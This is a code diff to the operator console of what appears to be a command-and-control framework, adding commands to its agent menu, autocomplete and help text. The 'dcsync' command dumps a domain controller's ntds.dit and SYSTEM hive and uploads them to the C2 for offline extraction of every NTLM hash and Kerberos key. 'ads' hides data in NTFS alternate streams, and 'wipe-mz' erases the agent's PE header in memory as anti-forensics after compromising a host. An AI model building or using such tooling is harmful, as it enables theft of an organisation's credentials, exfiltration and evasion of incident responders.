@@ -4651,6 +4651,9 @@ function agentContextMenu(e, agentId) {
       {_sub:'DCSync (SharpKatz)', _icon:IC_DB, items:[
         {label:'DCSync — all hashes…',         action:{fn:'dcsyncAll',  id}},
         {label:'DCSync — target user/krbtgt…', action:{fn:'dcsyncUser', id}},
+        null,
+        {label:'🗄️  DCSync nativo IFM (ntds.dit+SYSTEM → upload)', action:{fn:'selectAndTask', id, type:'DCSYNC', args:JSON.stringify({mode:'ifm',out:'C:\\Users\\Public\\dcsync_out'})}},
+        {label:'🗄️  DCSync nativo VSS (shadow copy → upload)',      action:{fn:'selectAndTask', id, type:'DCSYNC', args:JSON.stringify({mode:'vss',out:'C:\\Users\\Public\\dcsync_out'})}},
       ]},
       {_sub:'BloodHound (SharpHound)', _icon:IC_ATTACK_PATHS, items:[
         {label:'Collect All',           action:{fn:'bloodhoundCollect', id, method:'All'}},
@@ -7681,6 +7684,18 @@ const AC_COMMANDS = [
   ['adcs-request','adcs-request <ca> <template> <subject> [san=upn@domain] [out=C:\\path\\cert.pfx] — solicitar certificado vía certreq.exe (ESC1-6)'],
   // BOF store info
   ['bof-list','bof-list — mostrar info sobre tipos de argumentos BOF soportados'],
+  // DCSYNC — extracción nativa de ntds.dit + SYSTEM (sin SharpHound)
+  ['dcsync','dcsync [mode=ifm|vss] [out=C:\\path] — extraer ntds.dit + SYSTEM hive y subir al C2 (secretsdump.py offline)'],
+  ['dcsync ifm','dcsync ifm [out=C:\\path] — ntdsutil IFM snapshot (más sigiloso, no toca VSS)'],
+  ['dcsync vss','dcsync vss [out=C:\\path] — VSS shadow copy (funciona sin ntdsutil)'],
+  // Alternate Data Streams
+  ['ads','ads list|read|write|del <archivo>[:<stream>]'],
+  ['ads list','ads list <archivo> — listar streams ADS del archivo'],
+  ['ads read','ads read <archivo>:<stream> — leer contenido de un stream ADS'],
+  ['ads write','ads write <archivo>:<stream> <datos> — escribir datos en stream ADS'],
+  ['ads del','ads del <archivo>:<stream> — eliminar stream ADS'],
+  // Wipe PE headers
+  ['wipe-mz','wipe-mz — borrar cabecera MZ/PE del agente en memoria (anti-forensics)'],
 ];
 
 // Commands only available on Windows agents — hidden from autocomplete on Linux agents
@@ -7709,6 +7724,9 @@ const AC_WIN_ONLY = new Set([
   'peb-spoof','hwbp-clear','ntds-dump',
   'reg','reg query','reg set','reg delete','reg list',
   'lsass-dump-nt','adcs-request','bof-list',
+  'dcsync','dcsync ifm','dcsync vss',
+  'ads','ads list','ads read','ads write','ads del',
+  'wipe-mz',
 ]);
 
 let acIdx = -1;
@@ -8792,6 +8810,58 @@ ${isWin ? `  • Útil para encontrar PIDs objetivo para inject/inject-apc/token
   • Para cargar BOFs: bof-store load &lt;nombre&gt; &lt;archivo.coff&gt;
   • Para ejecutar: bof &lt;nombre|archivo.o&gt; [args]`,
 
+  'dcsync': `<b>dcsync</b> — extraer ntds.dit + SYSTEM hive y subir al C2
+
+  <span class="console-section">USO</span>
+  dcsync [ifm|vss] [out=C:\\ruta]
+
+  <span class="console-section">MODOS</span>
+  ifm (default)   ntdsutil "create full" — más sigiloso, sin VSS
+  vss             vssadmin shadow copy — funciona si ntdsutil no está
+
+  <span class="console-section">EJEMPLOS</span>
+  dcsync
+  dcsync vss out=C:\\Windows\\Temp\\dump
+
+  <span class="console-section">ANÁLISIS OFFLINE</span>
+  secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+  → extrae todos los hashes NTLM, Kerberos y LSA secrets
+
+  <span class="console-section">NOTAS</span>
+  • Requiere DA o SeBackupPrivilege (ejecutar desde DC o con acceso admin al DC)
+  • Los archivos ntds.dit y SYSTEM aparecen en la pestaña Files del agente
+  • Alternativa ligera: ntds-dump (solo ejecuta ntdsutil, no sube archivos)`,
+
+  'ads': `<b>ads</b> — gestión de Alternate Data Streams NTFS
+
+  <span class="console-section">USO</span>
+  ads list &lt;archivo&gt;
+  ads read &lt;archivo&gt;:&lt;stream&gt;
+  ads write &lt;archivo&gt;:&lt;stream&gt; &lt;datos&gt;
+  ads del &lt;archivo&gt;:&lt;stream&gt;
+
+  <span class="console-section">EJEMPLOS</span>
+  ads list C:\\Windows\\System32\\calc.exe
+  ads write C:\\test.txt:hidden secreto
+  ads read C:\\test.txt:hidden
+  ads del C:\\test.txt:hidden
+
+  <span class="console-section">NOTAS</span>
+  • Los streams ADS no aparecen en dir ni Explorer estándar
+  • Útil para ocultar payloads, notas o credenciales en archivos inocentes
+  • Herramienta de análisis: streams.exe (Sysinternals)`,
+
+  'wipe-mz': `<b>wipe-mz</b> — borrar cabecera MZ/PE del agente en memoria
+
+  <span class="console-section">USO</span>
+  wipe-mz
+
+  <span class="console-section">NOTAS</span>
+  • Sobreescribe los primeros bytes del PE cargado en memoria (MZ, cabeceras PE)
+  • Impide que herramientas de volcado de memoria reconstruyan el ejecutable
+  • Anti-forensics: el proceso sigue corriendo pero sin firma PE válida en RAM
+  • Hacer siempre tras comprometer un host sensible`,
+
   'port-scan': `<b>port-scan</b> — host discovery y TCP port scan desde el agente
 
   <span class="console-section">USO</span>
@@ -9633,6 +9703,58 @@ ${isWin ? `  • Useful for finding target PIDs for inject/inject-apc/token stea
   • Shows supported argument types: z (string), i (int32), s (int16), b (bool/byte), Z (wstring), B (binary blob)
   • Load BOFs: bof-store load &lt;name&gt; &lt;file.coff&gt;
   • Run: bof &lt;name|file.o&gt; [args]`,
+
+  'dcsync': `<b>dcsync</b> — extract ntds.dit + SYSTEM hive and upload to C2
+
+  <span class="console-section">USAGE</span>
+  dcsync [ifm|vss] [out=C:\\path]
+
+  <span class="console-section">MODES</span>
+  ifm (default)   ntdsutil "create full" — stealthier, no VSS
+  vss             vssadmin shadow copy — works if ntdsutil unavailable
+
+  <span class="console-section">EXAMPLES</span>
+  dcsync
+  dcsync vss out=C:\\Windows\\Temp\\dump
+
+  <span class="console-section">OFFLINE ANALYSIS</span>
+  secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+  → extracts all NTLM hashes, Kerberos keys and LSA secrets
+
+  <span class="console-section">NOTES</span>
+  • Requires DA or SeBackupPrivilege (run from DC or with admin access to DC)
+  • ntds.dit and SYSTEM files appear in the agent's Files tab
+  • Lightweight alternative: ntds-dump (runs ntdsutil only, no upload)`,
+
+  'ads': `<b>ads</b> — NTFS Alternate Data Stream management
+
+  <span class="console-section">USAGE</span>
+  ads list &lt;file&gt;
+  ads read &lt;file&gt;:&lt;stream&gt;
+  ads write &lt;file&gt;:&lt;stream&gt; &lt;data&gt;
+  ads del &lt;file&gt;:&lt;stream&gt;
+
+  <span class="console-section">EXAMPLES</span>
+  ads list C:\\Windows\\System32\\calc.exe
+  ads write C:\\test.txt:hidden secret
+  ads read C:\\test.txt:hidden
+  ads del C:\\test.txt:hidden
+
+  <span class="console-section">NOTES</span>
+  • ADS streams are invisible to dir and standard Explorer
+  • Useful for hiding payloads, notes or credentials inside innocent files
+  • Analysis tool: streams.exe (Sysinternals)`,
+
+  'wipe-mz': `<b>wipe-mz</b> — wipe MZ/PE header of the agent in memory
+
+  <span class="console-section">USAGE</span>
+  wipe-mz
+
+  <span class="console-section">NOTES</span>
+  • Overwrites the first bytes of the loaded PE in memory (MZ, PE headers)
+  • Prevents memory-dumping tools from reconstructing the executable
+  • Anti-forensics: process keeps running but has no valid PE signature in RAM
+  • Run immediately after compromising a sensitive host`,
 
   'port-scan': `<b>port-scan</b> — host discovery and TCP port scan from the agent
 
@@ -10887,6 +11009,17 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     case 'peb-spoof': taskType='PEB_SPOOF'; taskArgs=JSON.stringify({path:args}); break;
     case 'hwbp-clear': taskType='HWBP_CLEAR'; break;
     case 'ntds-dump': taskType='NTDS_DUMP'; taskArgs=args; break;
+    case 'dcsync': {
+      // dcsync [ifm|vss] [out=C:\path]
+      const dcParts = (args||'').trim().split(/\s+/);
+      const dcObj = {mode:'ifm', out:'C:\\Users\\Public\\dcsync_out'};
+      for (const p of dcParts) {
+        if (p==='ifm'||p==='vss') dcObj.mode=p;
+        else if (p.startsWith('out=')) dcObj.out=p.slice(4);
+      }
+      taskType='DCSYNC'; taskArgs=JSON.stringify(dcObj); break;
+    }
+    case 'wipe-mz': taskType='WIPE_MZ'; taskArgs=''; break;
     case 'elevate': {
       const spIdx = args.indexOf(' ');
       const method = spIdx >= 0 ? args.slice(0, spIdx) : args;
